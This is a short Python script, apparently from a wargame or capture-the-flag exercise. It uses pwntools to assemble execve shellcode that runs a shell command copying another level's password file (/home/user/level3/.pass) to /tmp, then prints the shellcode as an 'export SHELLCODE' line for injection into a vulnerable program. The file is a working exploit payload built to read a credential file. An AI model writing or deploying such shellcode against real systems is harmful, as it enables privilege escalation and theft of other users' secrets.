from pwn import *

args = ["/bin/sh", "-c", "cat /home/user/level3/.pass > /tmp/output"]
shellcode = asm(shellcraft.execve(args[0], args, []))

print(shellcode)
print(f"Architecture: {context.arch}")

# Export-style string
export_line = "export SHELLCODE=$'"
export_line += ''.join(f'\\x{b:02x}' for b in shellcode)
export_line += "'"

# Output the export command
print(export_line)
